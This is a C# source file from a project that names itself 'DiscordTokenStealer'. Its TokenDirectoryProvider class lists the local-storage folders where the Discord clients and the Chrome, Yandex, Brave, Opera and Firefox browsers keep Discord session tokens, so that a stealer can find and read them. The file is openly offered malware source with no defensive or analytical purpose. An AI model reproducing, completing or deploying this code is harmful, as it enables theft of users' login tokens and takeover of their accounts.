namespace DiscordTokenStealer.Discord;

public partial class TokenDirectoryProvider
{
    public readonly string Location;
    public readonly string SearchPattern;
    public bool Exists => Directory.Exists(Location);
    private static TokenDirectoryProvider? TryFind(string baseDir, string toFind, string searchPattern)
    {
        if (TryFindSubDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), baseDir), toFind, out string? dir) && dir != null)
        {
            return new TokenDirectoryProvider(dir, searchPattern);
        }
        return null;
    }

    private static bool TryFindSubDirectory(string directory, string toFind, out string? result)
    {
        foreach (string subDir in Directory.GetDirectories(directory, "*", SearchOption.AllDirectories))
        {
            string combined = Path.Combine(subDir, toFind);
            if (Directory.Exists(combined))
            {
                result = combined;
                return true;
            }
        }
        result = null;
        return false;
    }

    private TokenDirectoryProvider(string path, string searchPattern = "*.ldb")
    {
        Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
        SearchPattern = searchPattern;
    }
}

public partial class TokenDirectoryProvider
{
    #region Discord Clients
    public static readonly TokenDirectoryProvider Discord = new("discord\\Local Storage\\leveldb");

    public static readonly TokenDirectoryProvider DiscordCanary = new("discordcanary\\Local Storage\\leveldb");
    #endregion

    #region Browsers
    public static readonly TokenDirectoryProvider GoogleChrome = new("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly TokenDirectoryProvider Yandex = new("Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly TokenDirectoryProvider Brave = new("BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly TokenDirectoryProvider Opera = new("Opera Software\\Opera Stable\\User Data\\Default\\Local Storage\\leveldb");

    public static readonly TokenDirectoryProvider? MozillaFirefox = TryFind("Mozilla\\Firefox\\Profiles", "storage\\default\\https+++discord.com\\ls", "*.sqlite");
    #endregion
}